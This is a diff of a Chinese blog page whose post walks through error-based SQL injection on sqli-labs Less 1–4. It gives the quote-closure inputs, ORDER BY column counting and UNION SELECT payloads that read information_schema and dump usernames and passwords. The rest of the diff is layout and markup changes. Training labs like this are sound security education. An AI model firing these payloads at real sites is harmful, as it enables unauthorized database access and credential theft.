@@ -24,12 +24,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"cheriiceberg.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.10.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-  <meta name="description" content="0x00  GET报错注入0000    找出合适的闭合SQL语句">
+  <meta name="description" content="0x00 GET报错注入 0000 找出合适的闭合SQL语句">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入二">
 <meta property="og:url" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/index.html">
 <meta property="og:site_name" content="Pnnnnnj">
-<meta property="og:description" content="0x00  GET报错注入0000    找出合适的闭合SQL语句">
+<meta property="og:description" content="0x00 GET报错注入 0000 找出合适的闭合SQL语句">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less1error.jpg">
 <meta property="og:image" content="https://cheriiceberg.github.io/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less2error.jpg">
@@ -68,7 +68,7 @@
   <noscript>
     <link rel="stylesheet" href="/css/noscript.css">
   </noscript>
-
+  <link src="">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
@@ -166,7 +166,9 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-GET%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">0x00  GET报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0000-%E6%89%BE%E5%87%BA%E5%90%88%E9%80%82%E7%9A%84%E9%97%AD%E5%90%88SQL%E8%AF%AD%E5%8F%A5"><span class="nav-text">0000    找出合适的闭合SQL语句</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E7%A1%AE%E5%AE%9A%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0%E7%9A%84SQL%E8%AF%AD%E5%8F%A5%E5%8C%85%E8%A3%B9%E7%AC%A6%E5%8F%B7"><span class="nav-text">1、确定传入参数的SQL语句包裹符号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E5%BE%97%E5%87%BA%E9%97%AD%E5%90%88%E8%AF%AD%E5%8F%A5"><span class="nav-text">2、得出闭合语句</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0001-%E4%BD%BF%E7%94%A8order-by-%E8%AF%AD%E5%8F%A5%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-text">0001    使用order by 语句判断字段数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="nav-text">1、判断字段数的原因：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-text">2、使用方法：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0002-%E4%BD%BF%E7%94%A8union-select%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%8C%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="nav-text">0002    使用union select联合查询，获取表名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#x00-get%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">0x00 GET报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%BE%E5%87%BA%E5%90%88%E9%80%82%E7%9A%84%E9%97%AD%E5%90%88sql%E8%AF%AD%E5%8F%A5"><span class="nav-text">0000 找出合适的闭合SQL语句</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0%E7%9A%84sql%E8%AF%AD%E5%8F%A5%E5%8C%85%E8%A3%B9%E7%AC%A6%E5%8F%B7"><span class="nav-text">1、确定传入参数的SQL语句包裹符号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BE%97%E5%87%BA%E9%97%AD%E5%90%88%E8%AF%AD%E5%8F%A5"><span class="nav-text">2、得出闭合语句</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8order-by-%E8%AF%AD%E5%8F%A5%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-text">0001 使用order by
+语句判断字段数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-text">1、判断字段数的原因：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">2、使用方法：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8union-select%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="nav-text">0002 使用union
+select联合查询，获取表名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x01"><span class="nav-text">0x01</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -181,13 +183,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -298,53 +300,58 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="0x00-GET报错注入"><a href="#0x00-GET报错注入" class="headerlink" title="0x00  GET报错注入"></a>0x00  GET报错注入</h2><h3 id="0000-找出合适的闭合SQL语句"><a href="#0000-找出合适的闭合SQL语句" class="headerlink" title="0000    找出合适的闭合SQL语句"></a>0000    找出合适的闭合SQL语句</h3><span id="more"></span>
-
-<h4 id="1、确定传入参数的SQL语句包裹符号"><a href="#1、确定传入参数的SQL语句包裹符号" class="headerlink" title="1、确定传入参数的SQL语句包裹符号"></a>1、确定传入参数的SQL语句包裹符号</h4><p>找出闭合的方法，以sqli_labs中的less1-less4为例子</p>
+        <h2 id="x00-get报错注入">0x00 GET报错注入</h2>
+<h3 id="找出合适的闭合sql语句">0000 找出合适的闭合SQL语句</h3>
+<span id="more"></span>
+<h4
+id="确定传入参数的sql语句包裹符号">1、确定传入参数的SQL语句包裹符号</h4>
+<p>找出闭合的方法，以sqli_labs中的less1-less4为例子</p>
 <p>less1中的报错提示语句为</p>
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less1error.jpg"></p>
+<p><img src="less1error.jpg" /></p>
 <p>less2中的报错语句为</p>
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less2error.jpg"></p>
+<p><img src="less2error.jpg" /></p>
 <p>less3中的报错语句为</p>
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less3error.jpg"></p>
+<p><img src="less3error.jpg" /></p>
 <p>less4中的报错语句为</p>
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less4error.jpg"></p>
-<p>​    最左边与最右边的两个单引号是报错语句引用SQL语句的部分不属于SQL语句里的一部分，单引号里面的内容分别是</p>
+<p><img src="less4error.jpg" /></p>
+<p>​
+最左边与最右边的两个单引号是报错语句引用SQL语句的部分不属于SQL语句里的一部分，单引号里面的内容分别是</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1:	<span class="string">&#x27;1&#x27;&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">less2:	&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less3:	<span class="string">&#x27;1&#x27;&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">less4:	&quot;1\&quot; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
-
 <p>去掉输入的内容,得出大概的SQL语句</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less2:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span>  id  LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less3:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> (<span class="string">&#x27;id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less4:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> &quot;id&quot; LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="2、得出闭合语句"><a href="#2、得出闭合语句" class="headerlink" title="2、得出闭合语句"></a>2、得出闭合语句</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1: id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; --+(注释)</span></span><br><span class="line"><span class="string">less2: id = 1  --+</span></span><br><span class="line"><span class="string">less3: id = 1&#x27;</span>) <span class="comment">--+</span></span><br><span class="line">less4: id <span class="operator">=</span> <span class="number">1</span>&quot; --+</span><br></pre></td></tr></table></figure>
-
+<h4 id="得出闭合语句">2、得出闭合语句</h4>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1: id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; --+(注释)</span></span><br><span class="line"><span class="string">less2: id = 1  --+</span></span><br><span class="line"><span class="string">less3: id = 1&#x27;</span>) <span class="comment">--+</span></span><br><span class="line">less4: id <span class="operator">=</span> <span class="number">1</span>&quot; --+</span><br></pre></td></tr></table></figure>
 <p>输入闭合后的参数查询能正确进行</p>
-<h3 id="0001-使用order-by-语句判断字段数"><a href="#0001-使用order-by-语句判断字段数" class="headerlink" title="0001    使用order by 语句判断字段数"></a>0001    使用order by 语句判断字段数</h3><h4 id="1、判断字段数的原因："><a href="#1、判断字段数的原因：" class="headerlink" title="1、判断字段数的原因："></a>1、<strong>判断字段数的原因：</strong></h4><p><strong>在之后的<code>union select</code>的联合查询中需要利用正确的字段数进行</strong></p>
-<h4 id="2、使用方法："><a href="#2、使用方法：" class="headerlink" title="2、使用方法："></a>2、使用方法：</h4><p>在确定的闭合语句的参数后面加上<code>order by 字段数</code>，字段数的选择可以从1开始往后一个一个试，也可以使用二分法进行爆破</p>
+<h3 id="使用order-by-语句判断字段数">0001 使用order by
+语句判断字段数</h3>
+<h4 id="判断字段数的原因">1、<strong>判断字段数的原因：</strong></h4>
+<p><strong>在之后的<code>union select</code>的联合查询中需要利用正确的字段数进行</strong></p>
+<h4 id="使用方法">2、使用方法：</h4>
+<p>在确定的闭合语句的参数后面加上<code>order by 字段数</code>，字段数的选择可以从1开始往后一个一个试，也可以使用二分法进行爆破</p>
 <p>在less1-less4中，知道设置字段数为3都能成功查询，设置为4则不能成功查询，由此可知字段数为3</p>
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/lessorder.jpg"></p>
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/lessorder4.jpg"></p>
-<h3 id="0002-使用union-select联合查询，获取表名"><a href="#0002-使用union-select联合查询，获取表名" class="headerlink" title="0002    使用union select联合查询，获取表名"></a>0002    使用union select联合查询，获取表名</h3><p>在使用查询之前要了解应该从哪里获取表名字段名等信息，这就得先了解数据库的结构，大致的结构可以看以下图片了解</p>
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/sqlstruct.png"></p>
-<p>由此可得我们要查询<code>tables</code>表内的表名，使用<code>union select</code>之前要使原来的查询报错才会执行联合查询的语句 </p>
+<p><img src="lessorder.jpg" /></p>
+<p><img src="lessorder4.jpg" /></p>
+<h3 id="使用union-select联合查询获取表名">0002 使用union
+select联合查询，获取表名</h3>
+<p>在使用查询之前要了解应该从哪里获取表名字段名等信息，这就得先了解数据库的结构，大致的结构可以看以下图片了解</p>
+<p><img src="sqlstruct.png" /></p>
+<p>由此可得我们要查询<code>tables</code>表内的表名，使用<code>union select</code>之前要使原来的查询报错才会执行联合查询的语句</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">0</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/union123.jpg"></p>
-<p>从图中可以看出<code>union</code>查询的位置在数值2跟3 的位置，可在两个位置中选一个进行注入</p>
+<p><img src="union123.jpg" /></p>
+<p>从图中可以看出<code>union</code>查询的位置在数值2跟3
+的位置，可在两个位置中选一个进行注入</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()  --+</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selecttable.jpg"></p>
+<p><img src="selecttable.jpg" /></p>
 <p>通过查询可知在该数据库下有四个表分别为<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code>，现在查询<code>users</code>表中的字段名</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selectcolumn.jpg"></p>
-<p>查询到<code>users</code>表中的字段有三个，下一步查询<code>username</code>与<code>password</code>中的信息，在这之前的查询都是在汇总的 数据库<code>information_schema</code>中查询的，现在目标明确是要<code>users</code>表中的<code>usrename</code>与<code>password</code>字段里的数据，可以直接进行查询而不用到<code>information_schema</code>中查询（该数据库也不会存储字段的数据内容）</p>
+<p><img src="selectcolumn.jpg" /></p>
+<p>查询到<code>users</code>表中的字段有三个，下一步查询<code>username</code>与<code>password</code>中的信息，在这之前的查询都是在汇总的
+数据库<code>information_schema</code>中查询的，现在目标明确是要<code>users</code>表中的<code>usrename</code>与<code>password</code>字段里的数据，可以直接进行查询而不用到<code>information_schema</code>中查询（该数据库也不会存储字段的数据内容）</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span>:<span class="string">&#x27;,password),3 from users  --+</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selectend.jpg"></p>
+<p><img src="selectend.jpg" /></p>
 <p>less1-less4的注入就此结束，数据库中的所有信息都能获取到！</p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2>
+<h2 id="x01">0x01</h2>
+
     </div>
 
     
@@ -433,6 +440,12 @@
   
 
 
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
 
 
 <script class="next-config" data-name="twikoo" type="application/json">{"enable":true,"visitor":true,"envId":"https://twikoo-p91w.vercel.app","el":"#twikoo-comments"}</script>
